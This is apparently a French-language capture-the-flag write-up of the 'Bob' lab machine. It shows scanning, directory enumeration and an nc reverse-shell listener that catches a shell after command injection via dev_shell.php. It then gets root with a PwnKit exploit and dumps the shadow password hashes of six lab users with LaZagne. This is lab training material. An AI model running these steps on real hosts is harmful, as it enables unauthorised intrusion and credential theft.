# Bob

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.101
[i] Rate: 1000
 
🔥 Masscan 192.168.56.101...100%
👁️ Nmap 192.168.56.101...100%
 
[+] 80/tcp open
[+] 25468/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.101-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,zip,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about.html           (Status: 200) [Size: 2579]
/contact.html         (Status: 200) [Size: 3145]
/index.html           (Status: 200) [Size: 1425]
/login.html           (Status: 200) [Size: 1560]
/news.html            (Status: 200) [Size: 4086]
/passwords.html       (Status: 200) [Size: 673]
/robots.txt           (Status: 200) [Size: 111]
/robots.txt           (Status: 200) [Size: 111]
/server-status        (Status: 403) [Size: 302]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">🐾</span> nc**

J’ouvre le port `4444` pour que l’ors de mon injection de commande je puisse avoir un shell

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
```

&nbsp;

Injection de commande via `dev_shell.php`

<img width="977" height="642" alt="Capture du 2025-09-24 20-27-47" src="https://github.com/user-attachments/assets/bd5d9aac-a285-413e-ae41-98df00edca45" />


&nbsp;

<span style="color: #dddddd;">💲**Shell**</span>

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.56.101 56634
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Milburg-High:/var/www/html$
```

&nbsp;

🛰️ **fullEx**

Élévation de privilège

```
www-data@Milburg-High:/tmp/fullEx$ bash fullEx.sh -perm
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

Test de l’exploit d’élévation de privilège

```
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
./fullEx.sh -PwnKit64
root@Milburg-High:/tmp/fullEx#
```

&nbsp;

Recherche d’identifiant sur la machine

```
root@Milburg-High:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: seb
Hash: $6$4.6B1rmh$iaH45IN/kqI4A8Yg0oeY74nXxcicIV3gplln3koT/h2T9qDbs6b0jFWyRyuP5f23OAIyNf5F2WwptKSoDvD4o1:17589:0:99999:7:::

[+] Hash found !!!
Login: bob
Hash: $6$mwc2tuOb$TeB1IALW7IE4SFkvCH9Sls/KKtxv7oLotyqNHgfXIN9a7LuG/H6ii6iocMfwdDtCxfOEEZ6Pt9iSRtf52D9kZ0:17589:0:99999:7:::

[+] Hash found !!!
Login: c0rruptedb1t
Hash: $6$j5l5DMkY$BfqvgRmf5X6dpXdqeUue4AN4OxKwQY6I8nMxmrTmy1BupMhFBkMHGnl6pMC2b06zpVUA6YJMm7SHk4NrmEhHn1:17583:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$Gki8PIx6$S6zxQ8pPsOJeakxaE8/o4FnIsgXdsFHm1uf70QOubnQWBKIlVsE99CL8/dsqlh0/fuiNZaXptU2SJ1fDRbH8A1:17599:0:99999:7:::

[+] Hash found !!!
Login: elliot
Hash: $6$lyiTlPzo$4PiESwZ0ySFbVE1bVnfoj2D7E7GfC8cFGSydW5wwXR9.LOrRx56CgXuhwIkUsLP.P/Edrz2YqcbMGqDzyohsT0:17599:0:99999:7:::

[+] Hash found !!!
Login: jc
Hash: $6$RJ.XN2vQ$T.MHaNdVoHuUxTJjgG1i4NEff6TliP7PlP0FT7jsmjXRHDhmd1cVQxGDdzuxi2ybcQPB1GPQT.zvoaexcRuXh0:17589:0:99999:7:::


[+] 6 passwords have been found.
For more information launch it again with the -v option

elapsed time = 9.25296401978
```
